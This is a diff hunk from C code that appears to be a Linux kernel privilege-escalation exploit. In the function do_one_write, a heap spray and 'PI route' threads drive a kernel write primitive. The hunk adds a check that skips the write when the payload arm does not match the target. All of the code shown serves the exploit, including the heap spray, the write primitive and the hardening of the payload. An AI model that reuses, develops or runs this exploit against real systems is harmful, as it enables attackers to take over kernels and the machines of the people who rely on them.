@@ -360,6 +360,15 @@ static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) 
   page_base = prepare_good_kernel_page();
   if (!page_base) { pr_warning("  heap spray failed\n"); clear_pselect_write(); return 0; }
   TIMER("  heap spray done");
+  /* only the leaf arm stores zero, and the value arm does not, so a leaf
+   * payload fired at a value target zeroes it */
+  int arm_matches = leaf ? (fake_right == 0) : (fake_right != 0);
+  if (!arm_matches) {
+    pr_error("  payload arm mismatch leaf=%d fake_right=%016zx; skipping "
+             "write\n", leaf, fake_right);
+    clear_pselect_write();
+    return 0;
+  }
   int routed = run_main_route_threads();
   TIMER("  PI route done");
   clear_pselect_write();
